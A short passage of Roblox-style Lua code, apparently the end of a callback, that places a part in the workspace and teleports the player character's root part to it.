        part.CanQuery = false
        part.Parent = workspace

        hrp.CFrame = part.CFrame
    end
})
end